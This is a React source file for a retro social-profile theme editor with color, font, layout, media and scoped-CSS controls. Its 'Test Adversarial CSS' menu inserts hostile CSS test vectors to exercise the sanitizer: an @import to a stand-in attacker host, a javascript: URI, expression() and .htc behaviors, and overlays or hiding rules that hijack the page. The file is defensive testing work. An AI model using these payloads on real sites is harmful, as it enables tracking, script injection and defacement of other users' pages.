'use client';

import React, { useState, useEffect, useTransition } from 'react';
import {
  UserProfile,
  ProfileDesignTokens,
  LayoutBlock,
  SanitizedCssResult
} from '@/lib/types';
import { THEME_PRESETS } from '@/lib/presets';
import { sanitizeAndScopeCss } from '@/lib/sanitize-css';
import { SandboxedFrame } from './SandboxedFrame';
import { ShadowDomSandbox } from './ShadowDomSandbox';
import {
  Palette,
  Layout,
  Code2,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Save,
  Check,
  AlertTriangle,
  RotateCcw,
  Sparkles,
  Layers,
  Sliders,
  Type,
  Square,
  Eye,
  Zap,
  ArrowUp,
  ArrowDown,
  Columns,
  Disc,
  Tv,
  Music2
} from 'lucide-react';
import { parseYouTubeUrl, parseSpotifyUrl, POPULAR_RETRO_SOUNDTRACKS } from '@/lib/media-utils';

interface ThemeEditorProps {
  initialProfile: UserProfile;
}

export function ThemeEditor({ initialProfile }: ThemeEditorProps) {
  const [profile, setProfile] = useState<UserProfile>(initialProfile);
  const [activeTab, setActiveTab] = useState<'tokens' | 'layout' | 'media' | 'css'>('tokens');
  const [sandboxMode, setSandboxMode] = useState<'iframe' | 'shadow'>('iframe');
  const [viewport, setViewport] = useState<'desktop' | 'tablet' | 'mobile'>('desktop');

  // Real-time CSS AST sanitization state
  const [cssAudit, setCssAudit] = useState<SanitizedCssResult>(() =>
    sanitizeAndScopeCss(initialProfile.rawCss || '')
  );

  const [isSaving, setIsSaving] = useState(false);
  const [saveSuccess, setSaveSuccess] = useState(false);
  const [showTransformedCss, setShowTransformedCss] = useState(false);
  const [, startTransition] = useTransition();

  // Run real-time AST sanitization whenever rawCss updates
  useEffect(() => {
    const timer = setTimeout(() => {
      const result = sanitizeAndScopeCss(profile.rawCss || '');
      startTransition(() => {
        setCssAudit(result);
      });
    }, 150);

    return () => clearTimeout(timer);
  }, [profile.rawCss]);

  // Save profile to API
  const handleSave = async () => {
    setIsSaving(true);
    setSaveSuccess(false);
    try {
      const res = await fetch(`/api/profiles/${profile.username}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(profile)
      });
      if (res.ok) {
        setSaveSuccess(true);
        setTimeout(() => setSaveSuccess(false), 2500);
      }
    } catch (err) {
      console.error('Save failed', err);
    } finally {
      setIsSaving(false);
    }
  };

  // Preset theme application
  const applyPreset = (presetId: string) => {
    const preset = THEME_PRESETS.find((p) => p.id === presetId);
    if (!preset) return;

    setProfile((prev) => ({
      ...prev,
      tokens: { ...preset.tokens },
      rawCss: preset.sampleCss
    }));
  };

  // Adversarial Attack Test injections
  const injectAdversarialAttack = (attackType: string) => {
    let attackSnippet = '';
    switch (attackType) {
      case 'body-hide':
        attackSnippet = `/* ADVERSARIAL ATTACK 1: Attempt to hide the entire page */\nbody {\n  display: none !important;\n}\nhtml {\n  background: black !important;\n}`;
        break;
      case 'fullscreen-overlay':
        attackSnippet = `/* ADVERSARIAL ATTACK 2: Malicious fullscreen hijack overlay */\ndiv.hijack-takeover {\n  position: fixed !important;\n  top: 0 !important;\n  left: 0 !important;\n  width: 100vw !important;\n  height: 100vh !important;\n  background: rgba(220, 38, 38, 0.95) !important;\n  z-index: 999999 !important;\n  color: white !important;\n  padding: 50px;\n}`;
        break;
      case 'malicious-import-js':
        attackSnippet = `/* ADVERSARIAL ATTACK 3: External tracking @import and javascript: URI */\n@import url("https://attacker.example.com/steal-data.css");\n.profile-header {\n  background: url("javascript:alert('XSS_ATTACK')");\n  behavior: url('evil.htc');\n  width: expression(alert(1));\n}`;
        break;
      case 'navbar-nuke':
        attackSnippet = `/* ADVERSARIAL ATTACK 4: Attempt to kill parent platform navigation */\n#platform-navbar, nav, header {\n  display: none !important;\n  visibility: hidden !important;\n  opacity: 0 !important;\n}`;
        break;
      default:
        return;
    }

    setActiveTab('css');
    setProfile((prev) => ({
      ...prev,
      rawCss: attackSnippet + '\n\n' + (prev.rawCss || '')
    }));
  };

  // Token update helper
  const updateToken = <K extends keyof ProfileDesignTokens>(
    key: K,
    val: ProfileDesignTokens[K]
  ) => {
    setProfile((prev) => ({
      ...prev,
      tokens: {
        ...prev.tokens,
        [key]: val
      }
    }));
  };

  // Layout block movement helper
  const moveBlock = (index: number, direction: 'up' | 'down') => {
    const newLayout = [...profile.layout];
    const targetIndex = direction === 'up' ? index - 1 : index + 1;
    if (targetIndex < 0 || targetIndex >= newLayout.length) return;

    const temp = newLayout[index];
    newLayout[index] = newLayout[targetIndex];
    newLayout[targetIndex] = temp;

    // Reassign order
    newLayout.forEach((item, i) => {
      item.order = i + 1;
    });

    setProfile((prev) => ({ ...prev, layout: newLayout }));
  };

  const toggleBlockColumn = (id: string) => {
    setProfile((prev) => ({
      ...prev,
      layout: prev.layout.map((b) =>
        b.id === id ? { ...b, column: b.column === 'left' ? 'right' : 'left' } : b
      )
    }));
  };

  const toggleBlockVisibility = (id: string) => {
    setProfile((prev) => ({
      ...prev,
      layout: prev.layout.map((b) =>
        b.id === id ? { ...b, visible: !b.visible } : b
      )
    }));
  };

  return (
    <div className="flex flex-col h-[calc(100vh-4rem)] bg-slate-950 text-slate-100 overflow-hidden">
      {/* Editor Subheader & Action Toolbar */}
      <div className="flex flex-wrap items-center justify-between gap-3 px-4 py-2.5 bg-slate-900 border-b border-slate-800 z-10 select-none">
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-2">
            <Sparkles className="w-4 h-4 text-pink-400" />
            <span className="text-sm font-bold tracking-tight">
              Customizer Studio
            </span>
          </div>

          <div className="hidden lg:flex items-center gap-1.5 ml-2 pl-3 border-l border-slate-700">
            <span className="text-xs text-slate-400 font-medium">Theme Presets:</span>
            {THEME_PRESETS.map((preset) => (
              <button
                key={preset.id}
                type="button"
                onClick={() => applyPreset(preset.id)}
                className="text-xs px-2.5 py-1 rounded-md bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700 transition-colors"
              >
                {preset.name}
              </button>
            ))}
          </div>
        </div>

        {/* Adversarial Attack & Security Test Tools */}
        <div className="flex items-center gap-2">
          {/* Quick Adversarial Injection Test */}
          <div className="relative group">
            <button
              type="button"
              className="flex items-center gap-1.5 text-xs font-semibold px-3 py-1.5 rounded-lg bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/30 transition-colors"
            >
              <Zap className="w-3.5 h-3.5 text-red-400 animate-bounce" />
              <span>Test Adversarial CSS</span>
            </button>

            {/* Attack Preset Dropdown */}
            <div className="absolute right-0 top-full mt-1.5 hidden group-hover:block w-72 p-2 bg-slate-900 border border-slate-700 rounded-xl shadow-2xl z-50 text-xs">
              <p className="font-bold text-slate-300 px-2 py-1 border-b border-slate-800 mb-1 flex items-center justify-between">
                <span>Adversarial Test Vectors</span>
                <ShieldAlert className="w-3.5 h-3.5 text-red-400" />
              </p>
              <button
                type="button"
                onClick={() => injectAdversarialAttack('body-hide')}
                className="w-full text-left px-2 py-1.5 rounded hover:bg-slate-800 text-slate-200 transition-colors"
              >
                <div className="font-semibold text-red-300">1. Body Nuke (&apos;body &#123; display: none !important &#125;&apos;)</div>
                <div className="text-[10px] text-slate-400">Tests if canvas scoping prevents killing parent UI</div>
              </button>
              <button
                type="button"
                onClick={() => injectAdversarialAttack('fullscreen-overlay')}
                className="w-full text-left px-2 py-1.5 rounded hover:bg-slate-800 text-slate-200 transition-colors"
              >
                <div className="font-semibold text-red-300">2. Fullscreen Fixed Red Hijack</div>
                <div className="text-[10px] text-slate-400">Tests position: fixed neutralization &amp; iframe boundary</div>
              </button>
              <button
                type="button"
                onClick={() => injectAdversarialAttack('malicious-import-js')}
                className="w-full text-left px-2 py-1.5 rounded hover:bg-slate-800 text-slate-200 transition-colors"
              >
                <div className="font-semibold text-red-300">3. Malicious @import &amp; javascript: URI</div>
                <div className="text-[10px] text-slate-400">Tests AST stripping of external leaks &amp; XSS URIs</div>
              </button>
              <button
                type="button"
                onClick={() => injectAdversarialAttack('navbar-nuke')}
                className="w-full text-left px-2 py-1.5 rounded hover:bg-slate-800 text-slate-200 transition-colors"
              >
                <div className="font-semibold text-red-300">4. Target Parent Navbar (&apos;#platform-navbar&apos;)</div>
                <div className="text-[10px] text-slate-400">Tests selector scoping to .profile-canvas container</div>
              </button>
            </div>
          </div>

          {/* Sandbox Technology Mode Toggle */}
          <div className="flex items-center bg-slate-800 rounded-lg p-0.5 border border-slate-700 text-xs">
            <button
              type="button"
              onClick={() => setSandboxMode('iframe')}
              className={`px-2.5 py-1 rounded font-medium transition-colors ${
                sandboxMode === 'iframe'
                  ? 'bg-blue-600 text-white shadow-sm'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              Iframe Sandbox
            </button>
            <button
              type="button"
              onClick={() => setSandboxMode('shadow')}
              className={`px-2.5 py-1 rounded font-medium transition-colors ${
                sandboxMode === 'shadow'
                  ? 'bg-blue-600 text-white shadow-sm'
                  : 'text-slate-400 hover:text-white'
              }`}
            >
              Shadow DOM
            </button>
          </div>

          {/* Save Profile Button */}
          <button
            type="button"
            onClick={handleSave}
            disabled={isSaving}
            className="flex items-center gap-1.5 text-xs font-semibold px-4 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 text-white shadow-md transition-all active:scale-95 disabled:opacity-50"
          >
            {saveSuccess ? (
              <>
                <Check className="w-3.5 h-3.5 text-white animate-scale" />
                <span>Saved!</span>
              </>
            ) : (
              <>
                <Save className="w-3.5 h-3.5" />
                <span>{isSaving ? 'Saving...' : 'Save Profile'}</span>
              </>
            )}
          </button>
        </div>
      </div>

      {/* Main Split Pane Layout */}
      <div className="flex-1 flex flex-col md:flex-row overflow-hidden">
        {/* LEFT PANE: Customizer Controls (Width: 42%) */}
        <div className="w-full md:w-[45%] lg:w-[42%] flex flex-col border-r border-slate-800 bg-slate-900/80 backdrop-blur overflow-hidden">
          {/* Customizer Tabs Navigation */}
          <div className="flex items-center border-b border-slate-800 bg-slate-900/90 px-3 pt-2">
            <button
              type="button"
              onClick={() => setActiveTab('tokens')}
              className={`flex items-center gap-2 px-4 py-2.5 text-xs font-semibold rounded-t-lg transition-colors border-t-2 ${
                activeTab === 'tokens'
                  ? 'border-blue-500 bg-slate-800/90 text-white'
                  : 'border-transparent text-slate-400 hover:text-slate-200 hover:bg-slate-800/40'
              }`}
            >
              <Palette className="w-3.5 h-3.5 text-blue-400" />
              Design Tokens
            </button>

            <button
              type="button"
              onClick={() => setActiveTab('layout')}
              className={`flex items-center gap-2 px-4 py-2.5 text-xs font-semibold rounded-t-lg transition-colors border-t-2 ${
                activeTab === 'layout'
                  ? 'border-blue-500 bg-slate-800/90 text-white'
                  : 'border-transparent text-slate-400 hover:text-slate-200 hover:bg-slate-800/40'
              }`}
            >
              <Layout className="w-3.5 h-3.5 text-purple-400" />
              Layout Blocks
            </button>

            <button
              type="button"
              onClick={() => setActiveTab('media')}
              className={`flex items-center gap-2 px-4 py-2.5 text-xs font-semibold rounded-t-lg transition-colors border-t-2 ${
                activeTab === 'media'
                  ? 'border-blue-500 bg-slate-800/90 text-white'
                  : 'border-transparent text-slate-400 hover:text-slate-200 hover:bg-slate-800/40'
              }`}
            >
              <Disc className="w-3.5 h-3.5 text-emerald-400" />
              Soundtrack &amp; Media
            </button>

            <button
              type="button"
              onClick={() => setActiveTab('css')}
              className={`flex items-center gap-2 px-4 py-2.5 text-xs font-semibold rounded-t-lg transition-colors border-t-2 ${
                activeTab === 'css'
                  ? 'border-blue-500 bg-slate-800/90 text-white'
                  : 'border-transparent text-slate-400 hover:text-slate-200 hover:bg-slate-800/40'
              }`}
            >
              <Code2 className="w-3.5 h-3.5 text-pink-400" />
              Scoped CSS (Power User)
              {cssAudit.violations.length > 0 && (
                <span className="w-2 h-2 rounded-full bg-amber-400"></span>
              )}
            </button>
          </div>

          {/* Left Pane Scrollable Content */}
          <div className="flex-1 overflow-y-auto p-4 space-y-6">
            {/* TAB 1: DESIGN TOKENS */}
            {activeTab === 'tokens' && (
              <div className="space-y-6">
                {/* Colors Section */}
                <div className="space-y-3">
                  <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-2">
                    <Palette className="w-3.5 h-3.5 text-blue-400" />
                    Color Palette
                  </h3>

                  <div className="grid grid-cols-2 gap-3">
                    {/* Background Color */}
                    <div className="p-3 bg-slate-800/70 rounded-xl border border-slate-700/60">
                      <label className="block text-xs font-medium text-slate-300 mb-1.5">
                        Background Canvas
                      </label>
                      <div className="flex items-center gap-2">
                        <input
                          type="color"
                          value={profile.tokens.backgroundColor}
                          onChange={(e) => updateToken('backgroundColor', e.target.value)}
                          className="w-8 h-8 rounded border-none cursor-pointer bg-transparent"
                        />
                        <input
                          type="text"
                          value={profile.tokens.backgroundColor}
                          onChange={(e) => updateToken('backgroundColor', e.target.value)}
                          className="flex-1 text-xs px-2 py-1 rounded bg-slate-900 border border-slate-700 font-mono text-slate-200"
                        />
                      </div>
                    </div>

                    {/* Card Container Color */}
                    <div className="p-3 bg-slate-800/70 rounded-xl border border-slate-700/60">
                      <label className="block text-xs font-medium text-slate-300 mb-1.5">
                        Profile Card Color
                      </label>
                      <div className="flex items-center gap-2">
                        <input
                          type="color"
                          value={profile.tokens.cardColor}
                          onChange={(e) => updateToken('cardColor', e.target.value)}
                          className="w-8 h-8 rounded border-none cursor-pointer bg-transparent"
                        />
                        <input
                          type="text"
                          value={profile.tokens.cardColor}
                          onChange={(e) => updateToken('cardColor', e.target.value)}
                          className="flex-1 text-xs px-2 py-1 rounded bg-slate-900 border border-slate-700 font-mono text-slate-200"
                        />
                      </div>
                    </div>

                    {/* Accent Highlight Color */}
                    <div className="p-3 bg-slate-800/70 rounded-xl border border-slate-700/60">
                      <label className="block text-xs font-medium text-slate-300 mb-1.5">
                        Accent / Links
                      </label>
                      <div className="flex items-center gap-2">
                        <input
                          type="color"
                          value={profile.tokens.accentColor}
                          onChange={(e) => updateToken('accentColor', e.target.value)}
                          className="w-8 h-8 rounded border-none cursor-pointer bg-transparent"
                        />
                        <input
                          type="text"
                          value={profile.tokens.accentColor}
                          onChange={(e) => updateToken('accentColor', e.target.value)}
                          className="flex-1 text-xs px-2 py-1 rounded bg-slate-900 border border-slate-700 font-mono text-slate-200"
                        />
                      </div>
                    </div>

                    {/* Header Text Color */}
                    <div className="p-3 bg-slate-800/70 rounded-xl border border-slate-700/60">
                      <label className="block text-xs font-medium text-slate-300 mb-1.5">
                        Header Titles
                      </label>
                      <div className="flex items-center gap-2">
                        <input
                          type="color"
                          value={profile.tokens.headerColor}
                          onChange={(e) => updateToken('headerColor', e.target.value)}
                          className="w-8 h-8 rounded border-none cursor-pointer bg-transparent"
                        />
                        <input
                          type="text"
                          value={profile.tokens.headerColor}
                          onChange={(e) => updateToken('headerColor', e.target.value)}
                          className="flex-1 text-xs px-2 py-1 rounded bg-slate-900 border border-slate-700 font-mono text-slate-200"
                        />
                      </div>
                    </div>
                  </div>
                </div>

                {/* Background Pattern Section */}
                <div className="space-y-3">
                  <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-2">
                    <Sparkles className="w-3.5 h-3.5 text-pink-400" />
                    Retro Background Pattern
                  </h3>

                  <div className="grid grid-cols-3 gap-2">
                    {[
                      { id: 'none', label: 'Solid Clean' },
                      { id: 'stars', label: 'Starfield ✨' },
                      { id: 'glitter', label: 'Scene Glitter 💖' },
                      { id: 'scanlines', label: 'CRT Scanlines 📺' },
                      { id: 'retro-grid', label: 'Synthwave Grid 🌐' }
                    ].map((pat) => (
                      <button
                        key={pat.id}
                        type="button"
                        onClick={() => updateToken('backgroundPattern', pat.id as any)}
                        className={`p-2.5 rounded-lg border text-xs font-medium text-center transition-all ${
                          profile.tokens.backgroundPattern === pat.id
                            ? 'bg-blue-600/30 border-blue-500 text-white shadow-sm'
                            : 'bg-slate-800/60 border-slate-700 text-slate-300 hover:bg-slate-800 hover:text-white'
                        }`}
                      >
                        {pat.label}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Typography & Font Section */}
                <div className="space-y-3">
                  <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-2">
                    <Type className="w-3.5 h-3.5 text-purple-400" />
                    Typography & Fonts
                  </h3>

                  <div className="p-3 bg-slate-800/70 rounded-xl border border-slate-700/60 space-y-3">
                    <div>
                      <label className="block text-xs font-medium text-slate-300 mb-1">
                        Font Family
                      </label>
                      <select
                        value={profile.tokens.fontFamily}
                        onChange={(e) => updateToken('fontFamily', e.target.value)}
                        className="w-full text-xs p-2 rounded bg-slate-900 border border-slate-700 text-slate-200 focus:outline-none focus:border-blue-500"
                      >
                        <option value="Trebuchet MS, sans-serif">Trebuchet MS (Classic MySpace)</option>
                        <option value='"Comic Sans MS", cursive, sans-serif'>Comic Sans MS (Scene 2007)</option>
                        <option value='"Courier New", Courier, monospace'>Courier New (Cyberpunk Terminal)</option>
                        <option value="Georgia, serif">Georgia (Gothic Melancholy)</option>
                        <option value="Impact, fantasy">Impact (Bold Statement)</option>
                        <option value="Inter, sans-serif">Inter (Modern Clean)</option>
                      </select>
                    </div>

                    <div>
                      <label className="block text-xs font-medium text-slate-300 mb-1">
                        Text Content Color
                      </label>
                      <div className="flex items-center gap-2">
                        <input
                          type="color"
                          value={profile.tokens.textColor}
                          onChange={(e) => updateToken('textColor', e.target.value)}
                          className="w-8 h-8 rounded border-none cursor-pointer bg-transparent"
                        />
                        <input
                          type="text"
                          value={profile.tokens.textColor}
                          onChange={(e) => updateToken('textColor', e.target.value)}
                          className="flex-1 text-xs px-2 py-1 rounded bg-slate-900 border border-slate-700 font-mono text-slate-200"
                        />
                      </div>
                    </div>
                  </div>
                </div>

                {/* Border & Styling Section */}
                <div className="space-y-3">
                  <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-2">
                    <Square className="w-3.5 h-3.5 text-amber-400" />
                    Card Borders & Corners
                  </h3>

                  <div className="p-3 bg-slate-800/70 rounded-xl border border-slate-700/60 space-y-4">
                    {/* Border Radius */}
                    <div>
                      <div className="flex justify-between text-xs mb-1">
                        <span className="font-medium text-slate-300">Border Radius</span>
                        <span className="font-mono text-slate-400">{profile.tokens.borderRadius}</span>
                      </div>
                      <input
                        type="range"
                        min="0"
                        max="24"
                        step="2"
                        value={parseInt(profile.tokens.borderRadius, 10) || 0}
                        onChange={(e) => updateToken('borderRadius', `${e.target.value}px`)}
                        className="w-full accent-blue-500 cursor-pointer"
                      />
                    </div>

                    {/* Border Style */}
                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="block text-xs font-medium text-slate-300 mb-1">
                          Border Style
                        </label>
                        <select
                          value={profile.tokens.borderStyle}
                          onChange={(e) => updateToken('borderStyle', e.target.value as any)}
                          className="w-full text-xs p-2 rounded bg-slate-900 border border-slate-700 text-slate-200 focus:outline-none"
                        >
                          <option value="solid">Solid</option>
                          <option value="dashed">Dashed</option>
                          <option value="dotted">Dotted</option>
                          <option value="double">Double</option>
                          <option value="groove">Groove</option>
                        </select>
                      </div>

                      <div>
                        <label className="block text-xs font-medium text-slate-300 mb-1">
                          Border Color
                        </label>
                        <div className="flex items-center gap-1.5">
                          <input
                            type="color"
                            value={profile.tokens.borderColor}
                            onChange={(e) => updateToken('borderColor', e.target.value)}
                            className="w-7 h-7 rounded border-none cursor-pointer bg-transparent"
                          />
                          <input
                            type="text"
                            value={profile.tokens.borderColor}
                            onChange={(e) => updateToken('borderColor', e.target.value)}
                            className="flex-1 text-xs px-2 py-1 rounded bg-slate-900 border border-slate-700 font-mono text-slate-200"
                          />
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* TAB 2: MODULAR LAYOUT BLOCKS */}
            {activeTab === 'layout' && (
              <div className="space-y-4">
                <div className="p-3 bg-blue-500/10 border border-blue-500/30 rounded-xl text-xs text-blue-300">
                  <p className="font-semibold mb-0.5">Modular Column Ordering:</p>
                  <p className="opacity-90">
                    Organize your profile blocks between the Left column (Bio/Details) and Right column (Jukebox/Top 8/Guestbook).
                  </p>
                </div>

                <div className="space-y-2.5">
                  {profile.layout.map((block, idx) => (
                    <div
                      key={block.id}
                      className="p-3 rounded-xl border border-slate-700/80 bg-slate-800/80 flex items-center justify-between gap-3 transition-colors hover:border-slate-600"
                    >
                      <div className="flex items-center gap-3">
                        <button
                          type="button"
                          onClick={() => toggleBlockVisibility(block.id)}
                          className={`w-5 h-5 rounded flex items-center justify-center transition-colors ${
                            block.visible
                              ? 'bg-blue-600 text-white'
                              : 'bg-slate-700 text-slate-500'
                          }`}
                        >
                          <Eye className="w-3 h-3" />
                        </button>
                        <div>
                          <p className="text-xs font-bold text-slate-200">
                            {block.title}
                          </p>
                          <span className="text-[10px] font-mono px-1.5 py-0.2 rounded bg-slate-900 text-slate-400">
                            Column: {block.column.toUpperCase()}
                          </span>
                        </div>
                      </div>

                      <div className="flex items-center gap-1.5">
                        {/* Toggle Column */}
                        <button
                          type="button"
                          onClick={() => toggleBlockColumn(block.id)}
                          className="px-2 py-1 rounded text-xs bg-slate-700 hover:bg-slate-600 text-slate-200 flex items-center gap-1"
                          title="Switch between Left and Right column"
                        >
                          <Columns className="w-3 h-3" />
                          <span>{block.column === 'left' ? 'Move Right' : 'Move Left'}</span>
                        </button>

                        {/* Move Up/Down */}
                        <button
                          type="button"
                          disabled={idx === 0}
                          onClick={() => moveBlock(idx, 'up')}
                          className="p-1 rounded bg-slate-700 hover:bg-slate-600 text-slate-200 disabled:opacity-30"
                        >
                          <ArrowUp className="w-3 h-3" />
                        </button>
                        <button
                          type="button"
                          disabled={idx === profile.layout.length - 1}
                          onClick={() => moveBlock(idx, 'down')}
                          className="p-1 rounded bg-slate-700 hover:bg-slate-600 text-slate-200 disabled:opacity-30"
                        >
                          <ArrowDown className="w-3 h-3" />
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* TAB: SOUNDTRACK & MEDIA EMBEDS */}
            {activeTab === 'media' && (
              <div className="space-y-6">
                <div>
                  <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400 flex items-center gap-2">
                    <Disc className="w-3.5 h-3.5 text-emerald-400" />
                    Soundtrack &amp; Media Player
                  </h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Select how your profile music/video player appears to visitors.
                  </p>
                </div>

                {/* Player Type Selector */}
                <div className="grid grid-cols-3 gap-2">
                  <button
                    type="button"
                    onClick={() => setProfile((prev) => ({ ...prev, mediaType: 'retro-cassette' }))}
                    className={`p-3 rounded-xl border text-center transition-all flex flex-col items-center gap-2 ${
                      (!profile.mediaType || profile.mediaType === 'retro-cassette')
                        ? 'bg-blue-600/20 border-blue-500 text-white shadow-md'
                        : 'bg-slate-950/60 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <Disc className="w-5 h-5 text-indigo-400" />
                    <span className="text-xs font-bold">Retro Cassette</span>
                  </button>

                  <button
                    type="button"
                    onClick={() => setProfile((prev) => ({ ...prev, mediaType: 'spotify' }))}
                    className={`p-3 rounded-xl border text-center transition-all flex flex-col items-center gap-2 ${
                      profile.mediaType === 'spotify'
                        ? 'bg-emerald-600/20 border-emerald-500 text-white shadow-md'
                        : 'bg-slate-950/60 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <Music2 className="w-5 h-5 text-emerald-400" />
                    <span className="text-xs font-bold">Spotify Track</span>
                  </button>

                  <button
                    type="button"
                    onClick={() => setProfile((prev) => ({ ...prev, mediaType: 'youtube' }))}
                    className={`p-3 rounded-xl border text-center transition-all flex flex-col items-center gap-2 ${
                      profile.mediaType === 'youtube'
                        ? 'bg-red-600/20 border-red-500 text-white shadow-md'
                        : 'bg-slate-950/60 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <Tv className="w-5 h-5 text-red-400" />
                    <span className="text-xs font-bold">YouTube Video</span>
                  </button>
                </div>

                {/* SPOTIFY CONFIG */}
                {profile.mediaType === 'spotify' && (
                  <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-4">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-white flex items-center gap-1.5">
                        <Music2 className="w-4 h-4 text-emerald-400" />
                        Spotify URL
                      </span>
                      {profile.mediaUrl && parseSpotifyUrl(profile.mediaUrl).isValid ? (
                        <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 font-mono flex items-center gap-1">
                          <Check className="w-3 h-3" /> Valid Track Link
                        </span>
                      ) : (
                        <span className="text-[10px] text-slate-500 font-mono">
                          Paste track or album link
                        </span>
                      )}
                    </div>

                    <input
                      type="text"
                      placeholder="https://open.spotify.com/track/..."
                      value={profile.mediaUrl || ''}
                      onChange={(e) => setProfile((prev) => ({ ...prev, mediaUrl: e.target.value }))}
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-white text-xs font-mono focus:outline-none focus:border-emerald-500"
                    />

                    {/* Quick Pick Presets */}
                    <div className="space-y-1.5">
                      <span className="text-[11px] text-slate-400 font-semibold">Popular Retro Picks:</span>
                      <div className="flex flex-wrap gap-1.5">
                        {POPULAR_RETRO_SOUNDTRACKS.map((s) => (
                          <button
                            key={s.name}
                            type="button"
                            onClick={() =>
                              setProfile((prev) => ({
                                ...prev,
                                mediaUrl: s.spotifyUrl,
                                songTitle: s.name,
                                songArtist: s.artist
                              }))
                            }
                            className="text-[11px] px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700"
                          >
                            {s.artist} - {s.name}
                          </button>
                        ))}
                      </div>
                    </div>
                  </div>
                )}

                {/* YOUTUBE CONFIG */}
                {profile.mediaType === 'youtube' && (
                  <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-4">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-white flex items-center gap-1.5">
                        <Tv className="w-4 h-4 text-red-400" />
                        YouTube Video URL
                      </span>
                      {profile.mediaUrl && parseYouTubeUrl(profile.mediaUrl).isValid ? (
                        <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 font-mono flex items-center gap-1">
                          <Check className="w-3 h-3" /> Valid Video Detected
                        </span>
                      ) : (
                        <span className="text-[10px] text-slate-500 font-mono">
                          Paste youtube.com or youtu.be link
                        </span>
                      )}
                    </div>

                    <input
                      type="text"
                      placeholder="https://www.youtube.com/watch?v=..."
                      value={profile.mediaUrl || ''}
                      onChange={(e) => setProfile((prev) => ({ ...prev, mediaUrl: e.target.value }))}
                      className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-white text-xs font-mono focus:outline-none focus:border-red-500"
                    />

                    {/* Quick Pick Presets */}
                    <div className="space-y-1.5">
                      <span className="text-[11px] text-slate-400 font-semibold">Popular Music Videos:</span>
                      <div className="flex flex-wrap gap-1.5">
                        {POPULAR_RETRO_SOUNDTRACKS.map((s) => (
                          <button
                            key={s.name}
                            type="button"
                            onClick={() =>
                              setProfile((prev) => ({
                                ...prev,
                                mediaUrl: s.youtubeUrl,
                                songTitle: s.name,
                                songArtist: s.artist
                              }))
                            }
                            className="text-[11px] px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700"
                          >
                            {s.artist} - {s.name}
                          </button>
                        ))}
                      </div>
                    </div>
                  </div>
                )}

                {/* RETRO CASSETTE CONFIG */}
                {(!profile.mediaType || profile.mediaType === 'retro-cassette') && (
                  <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-4">
                    <span className="text-xs font-bold text-white flex items-center gap-1.5">
                      <Disc className="w-4 h-4 text-indigo-400" />
                      Retro Cassette Jukebox Track Details
                    </span>

                    <div className="grid grid-cols-2 gap-3">
                      <div className="space-y-1">
                        <label className="text-[11px] font-semibold text-slate-400">Song Title</label>
                        <input
                          type="text"
                          value={profile.songTitle || ''}
                          onChange={(e) => setProfile((prev) => ({ ...prev, songTitle: e.target.value }))}
                          placeholder="Song Title"
                          className="w-full px-3 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-white text-xs"
                        />
                      </div>
                      <div className="space-y-1">
                        <label className="text-[11px] font-semibold text-slate-400">Artist</label>
                        <input
                          type="text"
                          value={profile.songArtist || ''}
                          onChange={(e) => setProfile((prev) => ({ ...prev, songArtist: e.target.value }))}
                          placeholder="Artist Name"
                          className="w-full px-3 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-white text-xs"
                        />
                      </div>
                    </div>

                    <div className="space-y-1">
                      <label className="text-[11px] font-semibold text-slate-400">Direct Audio MP3 URL (Optional)</label>
                      <input
                        type="url"
                        value={profile.songAudioUrl || ''}
                        onChange={(e) => setProfile((prev) => ({ ...prev, songAudioUrl: e.target.value }))}
                        placeholder="https://.../song.mp3"
                        className="w-full px-3 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-white text-xs font-mono"
                      />
                      <p className="text-[10px] text-slate-500">
                        Plays through HTML5 audio with real-time waveform equalizer animation when clicked.
                      </p>
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* TAB 3: POWER USER SCOPED CSS */}
            {activeTab === 'css' && (
              <div className="space-y-4">
                <div className="flex items-center justify-between text-xs">
                  <div className="flex items-center gap-2">
                    <span className="font-bold text-slate-300">Raw CSS Editor</span>
                    <span className="text-[10px] px-2 py-0.5 rounded-full bg-pink-500/20 text-pink-300 font-mono border border-pink-500/30">
                      Auto-Scoped to .profile-canvas
                    </span>
                  </div>

                  <button
                    type="button"
                    onClick={() => setShowTransformedCss(!showTransformedCss)}
                    className="text-xs text-blue-400 hover:text-blue-300 underline font-mono flex items-center gap-1"
                  >
                    {showTransformedCss ? 'Hide Transformed AST' : 'View Transformed AST'}
                  </button>
                </div>

